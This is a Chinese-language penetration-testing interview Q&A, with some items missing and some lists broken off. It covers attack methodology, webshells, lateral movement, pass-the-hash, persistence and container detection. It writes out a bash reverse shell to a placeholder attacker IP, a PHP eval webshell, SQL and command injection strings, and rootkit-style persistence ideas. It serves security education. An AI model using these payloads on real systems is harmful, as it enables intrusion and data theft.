<h3 class="md-end-block md-heading"><span class="md-plain">1. 什么是渗透测试？</span></h3>
<p class="md-end-block md-p md-focus"><span class="md-plain">渗透测试（Penetration Testing）是一种模拟恶意攻击者的合法授权测试，通过主动探测、漏洞利用等手段，评估目标系统（网站、服务器、内网等）的安全性，发现潜在漏洞（如 SQL 注入、逻辑漏洞），并提供修复建议，最终目的是提升系统防御能力。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">2. 如何进行渗透测试？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">遵循 “规划→执行→报告” 流程：</span></p>

<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">前期规划</span></strong></span><span class="md-plain">：明确测试范围、目标、时间、规则（如禁止破坏数据、禁止影响业务），签订授权协议。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">信息收集</span></strong></span><span class="md-plain">：如前文所述，获取目标资产、技术栈、攻击面信息。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">漏洞识别</span></strong></span><span class="md-plain">：通过扫描工具（如 Nessus、AWVS）、手动测试（如 SQL 注入检测、XSS 测试）发现漏洞。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">漏洞利用</span></strong></span><span class="md-plain">：尝试利用漏洞（如 SQL 注入获取数据、上传 webshell 控制服务器），验证漏洞危害性。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">权限提升</span></strong></span><span class="md-plain">：从 Webshell 提权至系统权限（如利用 Windows 漏洞、Linux SUID 提权），扩大控制范围。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">内网渗透</span></strong></span><span class="md-plain">（若范围包含内网）：横向移动（如远程桌面、IPC$ 共享）、获取域控权限。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">清理痕迹与报告</span></strong></span><span class="md-plain">：删除测试文件、日志，输出漏洞详情、利用步骤、修复建议。</span></p>
</li>
</ol>

<h3 class="md-end-block md-heading"><span class="md-plain">4. 什么是 Shell、Payload、中间件？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Shell</span></strong></span><span class="md-plain">：在渗透测试中，指攻击者通过漏洞获取的目标系统命令行交互界面（如 webshell 是网页形式的命令行，可执行系统命令）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Payload</span></strong></span><span class="md-plain">：攻击载荷，指用于实现攻击目的的代码片段（如 SQL 注入的 “union select 1,2,3”、反弹 Shell 的 “bash -i >& /dev/tcp/ 攻击机 IP / 端口 0>&1”）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">中间件</span></strong></span><span class="md-plain">：位于操作系统与应用程序之间的软件，用于协调资源、提供通用服务（如 Web 中间件：Nginx、Apache；数据库中间件：MySQL、Redis；应用服务器中间件：Tomcat、WebLogic）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">5. Webshell 连接协议有哪些？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">HTTP/HTTPS</span></strong></span><span class="md-plain">：最常见，通过 POST/GET 请求传递命令（如中国菜刀、蚁剑的 “菜刀协议”），利用网页脚本（如</span><span class="md-pair-s" spellcheck="false"><code>eval($_POST[&#039;pass&#039;])</code></span><span class="md-plain">）执行命令。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">FTP</span></strong></span><span class="md-plain">：通过 FTP 协议上传 Webshell 后，直接操作文件系统（适用于已获取 FTP 权限的场景）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">SSH</span></strong></span><span class="md-plain">：通过反弹 Shell（如</span><span class="md-pair-s" spellcheck="false"><code>bash -i &gt;&amp; /dev/tcp/攻击者IP/端口 0&gt;&amp;1</code></span><span class="md-plain">）将 Webshell 与攻击者 SSH 客户端建立连接，隐蔽性较强。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">ICMP</span></strong></span><span class="md-plain">：极少见，将命令通过 ICMP 包（ping）传输，利用服务器脚本解析 ICMP 数据执行命令（绕过部分端口限制）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">6. 拿到目标站 shell 后的渗透思路</span></h3>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">信息收集</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">主机信息：系统版本、内核、进程（</span><span class="md-pair-s" spellcheck="false"><code>ps aux</code></span><span class="md-plain">）、网络配置（</span><span class="md-pair-s" spellcheck="false"><code>ip addr</code></span><span class="md-plain">）、用户权限（</span><span class="md-pair-s" spellcheck="false"><code>id</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">环境判断：是否在容器（</span><span class="md-pair-s" spellcheck="false"><code>/proc/self/cgroup</code></span><span class="md-plain">）、内网网段（</span><span class="md-pair-s" spellcheck="false"><code>route -n</code></span><span class="md-plain">）。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">权限提升</span></strong></span><span class="md-plain">：利用内核漏洞（如脏牛）、SUID 二进制文件、sudo 配置漏洞提权至 root。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">内网横向</span></strong></span><span class="md-plain">：扫描内网存活主机（</span><span class="md-pair-s" spellcheck="false"><code>nmap -sn 192.168.0.0/24</code></span><span class="md-plain">），尝试弱口令、漏洞（如永恒之蓝）横向移动。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">内网渗透</span></strong></span><span class="md-plain">：探测域环境（是否在域内，</span><span class="md-pair-s" spellcheck="false"><code>net view</code></span><span class="md-plain">）、域控 IP，利用域漏洞（如 MS17-010）横向至域控。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">持久化</span></strong></span><span class="md-plain">：留后门（crontab、计划任务、SSH 密钥），避免 shell 丢失。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">7. 如何对前端进行渗透测试？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">XSS 漏洞</span></strong></span><span class="md-plain">：检测存储型、反射型、DOM 型 XSS（如输入</span><span class="md-pair-s" spellcheck="false"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></span><span class="md-plain">到输入框）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">CSRF 漏洞</span></strong></span><span class="md-plain">：检查表单是否含</span><span class="md-pair-s" spellcheck="false"><code>csrf_token</code></span><span class="md-plain">，尝试伪造请求（如用 Burp 生成 POC，诱导用户点击）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">敏感信息泄露</span></strong></span><span class="md-plain">：查看前端源码（F12），检查注释、JS 文件是否含密钥（API Key）、账号密码。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">本地存储</span></strong></span><span class="md-plain">：检查</span><span class="md-pair-s" spellcheck="false"><code>localStorage</code></span><span class="md-plain">/</span><span class="md-pair-s" spellcheck="false"><code>sessionStorage</code></span><span class="md-plain">是否存储敏感数据（如 Token、用户信息）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">前端逻辑绕过</span></strong></span><span class="md-plain">：表单验证仅在前端（如密码长度、手机号格式），用 Burp 修改参数绕过。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">依赖组件漏洞</span></strong></span><span class="md-plain">：检查前端框架（如 Vue、React）或 npm 包是否有已知漏洞（用</span><span class="md-pair-s" spellcheck="false"><code>npm audit</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">点击劫持</span></strong></span><span class="md-plain">：检测是否可通过</span><span class="md-pair-s" spellcheck="false"><code>iframe</code></span><span class="md-plain">嵌套目标页面（防御需设置</span><span class="md-pair-s" spellcheck="false"><code>X-Frame-Options</code></span><span class="md-plain">）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">8. 如何对后端进行渗透测试？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">认证与授权</span></strong></span><span class="md-plain">：测试越权访问（水平：访问他人数据；垂直：普通用户访问管理员接口）、密码重置逻辑漏洞（如无需旧密码直接修改）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">注入漏洞</span></strong></span><span class="md-plain">：SQL 注入（</span><span class="md-pair-s" spellcheck="false"><code>id=1&#039; or &#039;1&#039;=&#039;1</code></span><span class="md-plain">）、命令注入（</span><span class="md-pair-s" spellcheck="false"><code>ip=127.0.0.1;ls</code></span><span class="md-plain">）、文件包含（</span><span class="md-pair-s" spellcheck="false"><code>file=../../etc/passwd</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">服务器与中间件漏洞</span></strong></span><span class="md-plain">：检测中间件版本（如 Apache 2.4.49 漏洞）、配置错误（如目录遍历、默认页面暴露）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">数据库安全</span></strong></span><span class="md-plain">：弱口令（如 MySQL 默认账号 root / 空密码）、未授权访问（如 MongoDB 27017 端口无认证）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">日志与错误处理</span></strong></span><span class="md-plain">：错误信息是否泄露路径（如</span><span class="md-pair-s" spellcheck="false"><code>Fatal error: in /var/www/html/</code></span><span class="md-plain">）、数据库类型。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">业务逻辑漏洞</span></strong></span><span class="md-plain">：如支付金额篡改（将</span><span class="md-pair-s" spellcheck="false"><code>price=100</code></span><span class="md-plain">改为</span><span class="md-pair-s" spellcheck="false"><code>price=1</code></span><span class="md-plain">）、订单状态越权修改。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">9. 如何对接口进行渗透测试？</span></h3>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">收集接口信息</span></strong></span><span class="md-plain">：获取 API 文档（Swagger、Postman 导出文件）、抓包分析请求（Burp Suite）、识别接口类型（REST、GraphQL）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">认证与授权测试</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">检测 Token 是否必填、是否可伪造（如修改 Token 用户 ID 越权）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">测试 Token 有效期（如过期后是否仍可使用）、刷新机制。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">参数安全测试</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">注入漏洞（SQLi、NoSQLi、命令注入，如</span><span class="md-pair-s" spellcheck="false"><code>id=1;drop table users</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">SSRF（参数含 URL 时，尝试访问内网地址</span><span class="md-pair-s" spellcheck="false"><code>http://127.0.0.1</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">逻辑漏洞（如</span><span class="md-pair-s" spellcheck="false"><code>page=1</code></span><span class="md-plain">改为</span><span class="md-pair-s" spellcheck="false"><code>page=-1</code></span><span class="md-plain">查看敏感数据）。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">请求方法测试</span></strong></span><span class="md-plain">：检测是否限制 HTTP 方法（如 POST 改为 GET 是否绕过验证）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">速率限制测试</span></strong></span><span class="md-plain">：高频请求是否触发限流（防止 DoS 攻击）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">数据泄露测试</span></strong></span><span class="md-plain">：响应是否包含敏感信息（如密码明文、手机号）。</span></p>
</li>
</ol>

<h3 class="md-end-block md-heading"><span class="md-plain">16. MSF 中路由的作用是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">路由用于实现</span><span class="md-pair-s "><strong><span class="md-plain">内网渗透</span></strong></span><span class="md-plain">：当通过一台边界主机（已获取会话）进入内网后，MSF 默认无法直接访问内网其他主机。通过</span><span class="md-pair-s" spellcheck="false"><code>route add</code></span><span class="md-plain">添加路由，可将内网网段流量通过已有的会话转发，实现对同网段其他主机的扫描、攻击（如横向移动）。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">17. 什么是 “哈希传递攻击”？其原理是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">哈希传递攻击（Pass-the-Hash, PtH）</span></strong></span><span class="md-plain"> 是一种凭据窃取技术，攻击者通过获取用户的 NTLM 哈希值（而非明文密码），直接利用该哈希值进行认证，绕过密码验证。</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：</span></p>

<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者通过漏洞（如 MS17-010）或工具（如 Mimikatz）获取目标系统的 NTLM 哈希；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">使用工具（如 </span><span class="md-pair-s" spellcheck="false"><code>pth-winexe</code></span><span class="md-plain">、CrackMapExec）将哈希值注入当前会话；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">系统验证哈希值有效性（无需明文密码），允许攻击者以该用户身份登录。</span></p>
</li>
</ol>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">防御措施</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">禁用 NTLM 认证，强制使用 Kerberos；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">启用 Windows Defender Credential Guard；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">限制管理员账户的网络访问；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">定期轮换敏感账户密码。</span></p>
</li>
</ul>
</li>
</ul>

 	<li class="md-list-item">

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">RC 脚本</span></strong></span><span class="md-plain">：修改 </span><span class="md-pair-s" spellcheck="false"><code>/etc/rc.local</code></span><span class="md-plain"> 或 </span><span class="md-pair-s" spellcheck="false"><code>/etc/init.d/</code></span><span class="md-plain"> 下的服务脚本；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Cron 任务</span></strong></span><span class="md-plain">：添加定时执行的任务（如 </span><span class="md-pair-s" spellcheck="false"><code>crontab -e</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">SSH 密钥植入</span></strong></span><span class="md-plain">：将公钥添加到 </span><span class="md-pair-s" spellcheck="false"><code>~/.ssh/authorized_keys</code></span><span class="md-plain">；</span></p>
</li>

<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">PAM 模块</span></strong></span><span class="md-plain">：修改 Pluggable Authentication Modules 实现认证绕过；</span></p>
</li>

<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">内核模块</span></strong></span><span class="md-plain">：加载恶意内核模块（如 LKM Rootkit）。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">19. 3389 无法连接的几种情况？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">目标端口未开放（未启用远程桌面服务）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">防火墙（本地或网络层）拦截 3389 端口（如 Windows 防火墙未允许远程桌面）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">目标主机不在同一网络（如内网 IP 未映射到公网，或路由不可达）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">远程桌面服务未启动（Windows 服务 “TermService” 未运行）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">账号权限不足（如未加入 “远程桌面用户” 组）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">配置限制（如远程桌面仅允许特定 IP 访问，或最大连接数已满）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">协议或加密方式不兼容（如客户端与服务器加密设置冲突）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">20. 如何判断域控主机？</span></h3>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">DNS SRV 记录查询：用</span><span class="md-pair-s" spellcheck="false"><code>nslookup -type=SRV _ldap._tcp.域名</code></span><span class="md-plain">或</span><span class="md-pair-s" spellcheck="false"><code>dig SRV _ldap._tcp.域名</code></span><span class="md-plain">，直接获取域控 IP。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">域内命令查询：</span><span class="md-pair-s" spellcheck="false"><code>nltest /DSGETDC:域名</code></span><span class="md-plain">可直接返回域控 IP；</span><span class="md-pair-s" spellcheck="false"><code>netdom query dc</code></span><span class="md-plain">列出主机名后，再通过</span><span class="md-pair-s" spellcheck="false"><code>ping</code></span><span class="md-plain">或</span><span class="md-pair-s" spellcheck="false"><code>nslookup</code></span><span class="md-plain">解析 IP。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">登录变量解析：</span><span class="md-pair-s" spellcheck="false"><code>echo %LOGONSERVER%</code></span><span class="md-plain">得到域控主机名，再用</span><span class="md-pair-s" spellcheck="false"><code>ping</code></span><span class="md-plain">或</span><span class="md-pair-s" spellcheck="false"><code>nslookup</code></span><span class="md-plain">获取 IP。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">端口扫描辅助：扫描开放 389、88、53 等端口的主机，结合其他方法验证其是否为域控 IP。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">21. 如何判断拿到的 shell在 Docker 容器中？</span></h3>


```
cat /proc/1/cgroup | grep -i docker && echo "In Docker" || echo "Not in Docker"
```


<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">检查容器特征文件</span></strong></span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">存在 </span><span class="md-pair-s" spellcheck="false"><code>/proc/self/cgroup</code></span><span class="md-plain">，且内容含 </span><span class="md-pair-s" spellcheck="false"><code>docker</code></span><span class="md-plain"> 或容器 ID（如 </span><span class="md-pair-s" spellcheck="false"><code>1:name=systemd:/docker/xxx</code></span><span class="md-plain">）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">存在 </span><span class="md-pair-s" spellcheck="false"><code>//.dockerenv</code></span><span class="md-plain"> 文件（部分容器有）</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">查看主机名与环境变量</span></strong></span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">主机名（</span><span class="md-pair-s" spellcheck="false"><code>hostname</code></span><span class="md-plain">）通常为短随机字符串（容器 ID 前几位）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">环境变量（</span><span class="md-pair-s" spellcheck="false"><code>env</code></span><span class="md-plain">）可能含 </span><span class="md-pair-s" spellcheck="false"><code>DOCKER_</code></span><span class="md-plain"> 前缀或容器相关配置</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">检查系统信息差异</span></strong></span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">

<h3 class="md-end-block md-heading"><span class="md-plain">22. 安卓 7.0 以上和以下 CA 证书限制区别</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">7.0 以下</span></strong></span><span class="md-plain">：用户手动安装的 CA 证书（用户证书）与系统预装证书同等信任，应用默认信任所有证书（包括用户添加的）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">7.0 以上</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">第三方应用默认</span><span class="md-pair-s "><strong><span class="md-plain">仅信任系统预装证书</span></strong></span><span class="md-plain">，不信任用户证书（需应用显式配置 </span><span class="md-pair-s" spellcheck="false"><code>network_security_config.xml</code></span><span class="md-plain"> 才会信任）。</span></p>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-plain md-expand">系统应用（如浏览器）仍信任用户证书，但第三方应用（如 App）需额外配置才能使用用户证书抓包。</span></p>
</li>
</ul>
</li>
</ul>
